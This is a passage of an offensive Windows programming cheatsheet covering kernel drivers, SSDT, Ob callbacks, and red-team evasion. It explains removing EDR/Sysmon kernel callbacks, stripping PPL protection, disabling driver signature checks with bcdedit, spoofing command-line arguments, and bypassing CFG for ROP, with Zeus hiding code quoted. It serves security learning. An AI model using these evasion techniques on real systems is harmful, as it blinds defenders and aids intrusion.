Few years ago, Microsoft decided to ban unsigned drivers from his operating system : you must disable it before to load your own driver, or use any vulnerability (like https://github.com/hmnthabit/CVE-2018-19320-LPE) to disable driver signing.

In a real pentest, you must find any vulnerable driver and profit:)

## System Service Dispatch Table (SSDT)

SSDT, or System Service Dispatch Table is a table (obvious) which can resolve by its current index the corresponding Nt function. When any usermode call is made, it is resolved as below : 
- ```OpenProcess``` (Win32 API function is called)
- ```NtOpenProcess``` (Resolved in ntdll.dll)

```asm
mov r10, rcx
mov eax, 26 
syscall
ret
```
> ntdll contains system call procedures for each Nt function

- 26 is the **service system number** : it is an index in the SSDT that resolves the address of the kernel NtOpenProcess function.
- Kernelmode NtOpenProcess is called, and communicate with I/O as a part of a driver.

SSDT is defined in a **Service Descriptor Table** :
```cpp
typedef struct tagSERVICE_DESCRIPTOR_TABLE {
    SYSTEM_SERVICE_TABLE nt; //effectively a pointer to Service Dispatch Table (SSDT) itself
    SYSTEM_SERVICE_TABLE win32k;
    SYSTEM_SERVICE_TABLE sst3; //pointer to a memory address that contains how many routines are defined in the table
    SYSTEM_SERVICE_TABLE sst4;
} SERVICE_DESCRIPTOR_TABLE;
```

SSDT is/was often hooked by rootkits as it was possible to modify the corresponding address to their own functions. **Patchguard** has disabled this possibility, unless in case of some internal vulnerability. 

> Many antivirus products are also using this trick today, probably by using the same techniques than evil hackers;)

## Driver entry

Driver entry proc is defined as below : 
```cpp
#include <ntddk.h>

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	return STATUS_SUCCESS;
}
```

It is very important to use `UNREFERENCED_PARAMETER()` macro on `DriverObject` and `RegistryPath` parameters, unless they are referenced by adding some code later.
```cpp
UNREFERENCED_PARAMETER(DriverObject);
UNREFERENCED_PARAMETER(RegistryPath);
```

## Input Output

Use MajorFunction `IRP_MJ_CREATE` and `IRP_MJ_CLOSE` to act as "interrupt" to communicate with your driver from client-side.

```cpp
DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
```

Then define your CreateClose function : 
```cpp
NTSTATUS
CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	DbgPrint("[+] Hello from FirstDriver CreateClose\n");

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
```

Complete sample code here : //

## Communicate with the driver

User-mode applications send IOCTLs to drivers by calling DeviceIoControl, which is described in Microsoft Windows SDK documentation. Calls to DeviceIoControl cause the I/O manager to create an IRP_MJ_DEVICE_CONTROL request and send it to the topmost driver (https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-i-o-control-codes)

The userland app must use DeviceIoControl (ioapiset.h) function to communicate with a driver.
It will be used to send various requests to its **Device** object.

Simple sample code here : //todo

## Driver signing

As described in [General concepts](#general-concepts) section, drivers must be signed before to install on a Windows system. Despite the fact you must use some driver or kernel exploit to bypass it (Gigabyte driver CVE for example), you can still disable it manually:
```powershell
bcdedit.exe -set loadoptions DISABLE_INTEGRITY_CHECKS
bcdedit.exe -set TESTSIGNING ON
```
Then restart your computer. Obviously you need local admin rights on the machine you want to execute these command. As a restart is needed, **this not OPSEC at all**.


## Custom Callbacks

ObRegisterCallbacks (wdm.h) allow you to defined "custom" callbacks that can be used to modify behavior of a usermode app when being triggered by a specific operation, like CreateProcess/OpenProcess (Handle create).

Basically, Ob Callbacks are defined with a OB_OPERATION_REGISTRATION array, which will be filled with OB_CALLBACK_REGISTRATION struct (filled with callbacks).

Example to trigger on OpenProcess/CreateProcess :

```c
OB_OPERATION_REGISTRATION obOperationRegistrationArray[1] = { 0 };
OB_CALLBACK_REGISTRATION obCallbackRegistration = { 0 };

obOperationRegistrationArray[0].ObjectType = PsProcessType; //monitor for handles
obOperationRegistrationArray[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE; //detect created and duplicated handles
obOperationRegistrationArray[0].PreOperation = process_ob_pre_op_callbacks; //intercept before the end of the operation with a pointer to a defined function in your own code
obOperationRegistrationArray[0].PostOperation = NULL; //do nothing after the operation has been completed

NTSTATUS status_register = ObRegisterCallbacks(&obCallbackRegistration, &reg_handle); //register callbacks
	if (!NT_SUCCESS(status_register)) {
		DbgPrint("[-] Error while trying to register callbacks\n");
	}
	else {

		DbgPrint("[+] Registering callbacks !\n");
	}
```

**process_ob_pre_op_callbacks** is a user defined function which will be called when the the callback will be intercepted, and therefore can disallow or allow the operation.

```c
OB_PREOP_CALLBACK_STATUS process_ob_pre_op_callbacks(PVOID registrationContext, POB_PRE_OPERATION_INFORMATION pObPreOperationInformation) {

	if (pObPreOperationInformation->KernelHandle) return OB_PREOP_SUCCESS; //if handle is a kernel handle, pass
	pObPreOperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~My_PROCESS_ALL_ACCESS; //remove PROCESS_ALL_ACCESS from handle
}
```

**Note** : My_PROCESS_ALL_ACCESS can be defined as ```#define My_PROCESS_ALL_ACCESS (0x1FFFFF)``` (win32 hexa code).


# Offensive Driver Programming

## Patch kernel callback

Kernel Callbacks were introduced by Microsoft mainly to offer a better way to AVs/EDRs editors to monitor and prevent suspicious actions (Before them, lot of security products were using kernel mode patching like SSDT hooks to do the same job, but the new PatchGuard protection constrained them to use this new solution).

They are several types of kernel callbacks, especially : 

	- ProcessNotify : called when a process is created or exits.
	- ThreadNotify : called when a thread is created or exits (is deleted).
	- LoadImageNotify : called when some executable image is loaded by an other exe (example : DLL loaded by a process)

Each of them has its associated function, such as **PsSetCreateProcessNotifyRoutineEx** to set them in your driver. The latter register a callback routine as a new process is created or deleted in the Windows system. Its prototype is defined as below : 

```cpp
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
  [in] PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
  [in] BOOLEAN                           Remove
);
```

**PCREATE_PROCESS_NOTIFY_ROUTINE_EX** is a pointer to the callback routine which will be called when the event will be triggered (here, process created/exits).
**Remove** is a simple flag which indicate if PsSetCreateProcessNotify will register the callback function or delete it (useful in your driver's cleanup function).

The callback function will use this prototype : 

```cpp
void OnProcessNotify(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
);
```
where **Process** is the current process being created/deleted, **ProcessId** is the id of this process, and **CreateInfo** is a structure that contains various info about this process.

When a driver registers a new callback routine, its address will be stored in an array usually named **Psp**name_of_your_callback. For example, the list of all ProcessNotifyRoutine functions is stored in the **PspCreateProcessNotifyRoutine** array.

To remove such callbacks, you will simply need to empty this array !

Unfortunately, the address of this so exciting array does not have any direct way to be retrieved. Fortunately, they are many ways to do so manually, by searching for some specific offsets in memory.

Once you find the right address, you can enumerate all callbacks registered and filter them by driver name (Sysmon driver maybe ?:)), and only remove the corresponding callback functions in the list.



## Patch Protected Process

Protected Processes were introduced with Windows Vista. It can be defined as a struct named EPROCESS (undefined : https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess) which define if the process is protected or not with three interesting members : 

```
kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : Ptr64 Void
   [...snip...]
   +0x6c8 SignatureLevel   : UChar //signature integrity of exe
   +0x6c9 SectionSignatureLevel : UChar //Second member : same as first for DLL loaded by the exe
   +0x6ca Protection       : _PS_PROTECTION
```
The third member (Protection) is a PS_PROTECTION struct which is defined as below :

```
_PS_PROTECTION
  +0x000 Level            : UChar
  +0x000 Type             : Pos 0, 3 Bits
  +0x000 Audit            : Pos 3, 1 Bit
  +0x000 Signer           : Pos 4, 4 Bits
```

To remove PPL protection, you must set SignatureLevel,SectionSignatureLevel and Protection to 0.

As the offset between EPROCESS base address and PS_PROTECTION is 0x6c8, you can retrieve it by additionate the two values.

Example code : //todo


# Using Win32 API to increase OPSEC

## Persistence ⏳

### Scheduled Tasks ⏳

## Command line spoofing

Works perfectly even with sysmon/process hacker monitoring; it enables the ability to hide your command args, which can be useful in pentest/red team ops (```powershell -enc .....```)

To achieve that objective, you can spawn a new process with "legit" command args in supended mode, then edit these args directly in PEB.

Poc : https://github.com/NVISOsecurity/blogposts/blob/master/examples-commandlinespoof/Example%203%20-%20CMD%20spawn%20with%20fake%20procexp%20args/code.cpp
 
# Misc Stuff

## x64 Calling Convention

- First 4 integer arguments are passed in registers `RCX`, `RDX`, `R8`, and `R9`.
- Additional arguments are pushed onto the stack.
- The return address is followed by a 32-byte area reserved for `RCX`, `RDX`, `R8`, and `R9`.
- Local variables and non-volatile registers are stored above the return address.
- `RBP` is not used to reference local variables/function arguments, and `RSP` remains constant throughout the function.

> Notes:
> - If a function has a variable number of arguments, it must use the stack to pass them
> - If the return value is a structure, then the caller is responsible for allocating space for the return value and passing a pointer to that space as the first argument
> - The callee is responsible for preserving the values of the `RBX`, `RBP`, and `R12`–`R15` registers, but may freely modify the other registers
> - The stack is aligned to a 16-byte boundary at the call site
> - The callee is responsible for restoring the stack pointer (`RSP`) to its original value before returning

## Indirect Execution

Indirect Execution here refers to a ROP to achieve the execution of some tasks, you will need to add parameters to the right register, you must understand [x64 calling convention](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet#x64-calling-convention) for that.

- ROP with `CONTEXT` structure will need `RtlCaptureContext` to retrieve the current context and `NtContinue` to continue the execution of the ROP with `CONTEXT` struct as parameter filled with the right function arguments to the right registers. You can also build your ROP in assembly if you want.

### CFG Bypass with SetProcessValidCallTargets

This is not a real bypass but it'll whitelist the function you're using in your ROP (i.e. `NtContinue`)
```c
CFG_CALL_TARGET_INFO Cfg = { 0 };

Cfg.Offset = ( ULONG_PTR )pAddress - ( ULONG_PTR )Mbi.BaseAddress;
Cfg.Flags  = CFG_CALL_TARGET_VALID;

SetProcessValidCallTargets( ( HANDLE )-1,  Mbi.BaseAddress, Mbi.RegionSize, 1, &Cfg );
```



# Malware/Sophisticated techniques

## Emotet PPID Spoofing 

This technique has been discovered in the well-known malware Emotet. To spawn a new powershell process (intented to execute some payload), it use the COM api with a WMI instance. With this trick, the powershell process is spawned as a child process of the WMIPrvSE process, which far less suspicious than be spawning by a suspicious exe or even a Word file.

## Zeus Malware Hidden Files

The well-know Zeus malware use some quite ingenious trick to hide its logs (keystrokes, password ,etc) in the compromised system. It hooks the ```NtQueryDirectoryFile()``` function to filter displayed results.

```cpp
typedef struct _FILE_NAMES_INFORMATION {
 ULONG NextEntryOffset;
 ULONG FileIndex;
 ULONG FileNameLength;
 WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

 if (file_matches)
 {

 // Check for end of list
 if (pCurrentFileNames->NextEntryOffset == 0)
 {
 // Hide current file
 if (pPrev)
 pPrevFileNames->NextEntryOffset = 0;
 else
 return STATUS_NO_SUCH_FILE; 
 ```
 
 Source : https://ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf
 
 
 ## SpyEye keyloger hooking technique
 
 SpyEye malware hooks ```TranslateMessage()``` function to save keystrokes : the hook procedure use ```GetKeyboardState``` function to add the typed char to a 20000 bytes buffer.
 
 Source : https://ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf
 
 ## Wannacry KillSwitch
 
 Wannacry ransomware used a killswitch URL which was resolved before the execution of the main payload. After this domaine has been registred, all wannacry samples has been disabled. This technique was related here : https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html
 Fun fact: this domain was in clear string, without any obfuscation. Quite funny:)
